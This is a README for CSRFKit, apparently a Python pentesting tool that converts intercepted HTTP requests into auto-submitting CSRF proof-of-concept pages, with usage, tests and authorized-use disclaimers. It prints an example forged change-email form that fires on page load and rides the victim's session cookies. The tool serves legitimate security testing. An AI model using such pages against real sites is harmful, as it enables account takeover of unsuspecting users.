# CSRFKit

> **For authorized security testing only.** This tool is intended for penetration testers, bug bounty researchers, and security engineers performing legitimate assessments on systems they own or have explicit written permission to test.

A command-line tool that converts raw HTTP requests or cURL commands into ready-to-use HTML Cross-Site Request Forgery (CSRF) Proof of Concept pages.

---

## Table of Contents

- [What it Does](#what-it-does)
- [How it Works](#how-it-works)
- [Project Structure](#project-structure)
- [Installation](#installation)
- [Usage](#usage)
- [Input Formats](#input-formats)
- [Output](#output)
- [Running the Tests](#running-the-tests)
- [Limitations & Warnings](#limitations--warnings)
- [License](#license)

---

## What it Does

CSRFKit takes an HTTP request (intercepted from a proxy like Burp Suite, OWASP ZAP, or copied from browser DevTools) and generates a self-submitting HTML page that, when opened by a victim in their browser, automatically replays that request.

**In 3 steps:**

1. You intercept a sensitive HTTP request (e.g., a password change or email update).
2. You run CSRFKit with that request as input.
3. You get an HTML file that auto-submits the form — ready to test CSRF impact.

---

## How it Works

```
Raw HTTP request / cURL command
            │
            ▼
      ┌─────────────┐
      │   Parser    │  Splits headers, method, URL, and body fields
      └──────┬──────┘
             │
             ▼
      ┌─────────────┐
      │  Analyzer   │  Checks if the request is form-compatible and
      └──────┬──────┘  issues warnings (e.g. JSON body, custom headers)
             │
             ▼
      ┌─────────────┐
      │  Generator  │  Builds an auto-submitting HTML form with
      └──────┬──────┘  hidden inputs for each request parameter
             │
             ▼
      ┌─────────────┐
      │   Writer    │  Saves the HTML PoC to disk
      └─────────────┘
```

---

## Project Structure

```
csrf poc generator/
├── src/
│   ├── main.py                   # CLI entry point
│   ├── core/
│   │   ├── request_model.py      # Shared HttpRequest dataclass
│   │   ├── csrf_analyzer.py      # CSRF compatibility checker
│   │   └── validators.py         # Reusable validation helpers
│   ├── parser/
│   │   ├── raw_http_parser.py    # Parses raw HTTP request text
│   │   ├── curl_parser.py        # Parses cURL commands
│   │   └── body_parser.py        # Decodes URL-encoded request bodies
│   ├── generator/
│   │   ├── html_generator.py     # Builds the HTML PoC string
│   │   └── templates.py          # HTML template strings
│   └── output/
│       └── writer.py             # Writes the HTML file to disk
├── tests/
│   ├── test_raw_http_parser.py
│   ├── test_body_parser.py
│   └── test_html_generator.py
├── examples/
│   ├── sample_request.txt        # Example raw HTTP input
│   └── generated_poc.html        # Example generated output
└── README.md
```

---

## Installation

**Requirements:** Python 3.10 or later. No third-party packages are required to run the tool — it uses only the Python standard library.

```bash
# Clone the repository
git clone https://github.com/your-username/csrf-poc-generator.git
cd csrf-poc-generator
```

To run the test suite, install `pytest`:

```bash
pip install pytest
```

---

## Usage

Run the tool from the project root using Python's module runner:

```bash
python -m src.main -i <input_file> -o <output_file>
```

### Arguments

| Argument | Required | Description |
|---|---|---|
| `-i` / `--input` | ✅ Yes | Path to a file containing a raw HTTP request |
| `-o` / `--output` | ❌ No | Path to save the generated HTML PoC (default: `examples/generated_poc.html`) |

### Example

```bash
python -m src.main -i examples/sample_request.txt -o output/poc.html
```

Output:

```
Generated CSRF PoC: output/poc.html
```

If the request has potential compatibility issues (e.g. a JSON body or a custom authentication header), warnings are printed before the file is saved:

```
Warning: Content-Type application/json is not form-compatible.
Warning: Request includes headers that plain HTML forms cannot set.
Generated CSRF PoC: output/poc.html
```

---

## Input Formats

### Raw HTTP Request

Save the raw request (as copied from Burp Suite or any HTTP proxy) to a `.txt` file.

**`examples/sample_request.txt`:**

```http
POST /change-email HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

email=test@example.com&display_name=Test+User
```

### cURL Command *(via the Python API)*

The `curl_parser` module can also parse cURL commands as copied from browser DevTools (**Copy as cURL**):

```python
from src.parser.curl_parser import parse_curl
from src.generator.html_generator import generate_html_poc

cmd = """curl 'https://example.com/change-email' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'email=test@example.com&display_name=Test+User'"""

request = parse_curl(cmd)
html = generate_html_poc(request)
```

Supported cURL flags:

| Flag | Description |
|---|---|
| `-X` / `--request` | HTTP method |
| `-H` / `--header` | Request header (repeatable) |
| `--data-raw` | Raw request body |
| `-d` / `--data` | Request body |
| `--data-urlencode` | URL-encoded request body |

---

## Output

The generated HTML file contains a standard HTML form pre-filled with the request parameters as hidden inputs. A small JavaScript snippet auto-submits the form the moment the page loads:

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>CSRF PoC</title>
</head>
<body>
  <p>For authorized security testing only.</p>
  <form action="https://example.com/change-email" method="POST">
    <input type="hidden" name="email" value="test@example.com">
    <input type="hidden" name="display_name" value="Test User">
    <button type="submit">Submit request</button>
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

When a logged-in victim opens this file in their browser, their browser automatically sends the forged request to the target — including their session cookies.

---

## Running the Tests

Run the full test suite (56 tests):

```bash
python -m pytest tests/ -v
```

Run a specific test file:

```bash
python -m pytest tests/test_raw_http_parser.py -v
python -m pytest tests/test_body_parser.py -v
python -m pytest tests/test_html_generator.py -v
```

Run a specific test by name:

```bash
python -m pytest tests/test_raw_http_parser.py::TestSplitHeadAndBody -v
```

Stop on the first failure:

```bash
python -m pytest tests/ -v -x
```

---

## Limitations & Warnings

- **`GET` and `POST` only.** Standard HTML forms do not support `PUT`, `DELETE`, `PATCH`, or other HTTP methods. Requests using those methods will trigger a warning.
- **Form-compatible content types only.** Requests with `application/json` or `application/xml` bodies cannot be natively reproduced by an HTML form. A warning is issued and the form will have no hidden fields.
- **Custom headers are not supported.** Headers like `Authorization`, `X-CSRF-Token`, or `X-Requested-With` cannot be set by a plain HTML form. Their presence triggers a warning, and the generated PoC will not include them.
- **No multipart body parsing yet.** `multipart/form-data` bodies are recognized as form-compatible but field parsing is not yet implemented.

---

## Legal Disclaimer

This tool is provided for **educational and authorized security testing purposes only**. Unauthorized use of this tool against systems you do not own or do not have explicit written permission to test is **illegal** and may result in criminal prosecution. The authors accept no liability for misuse.

---

## License

This project is licensed under the MIT License.
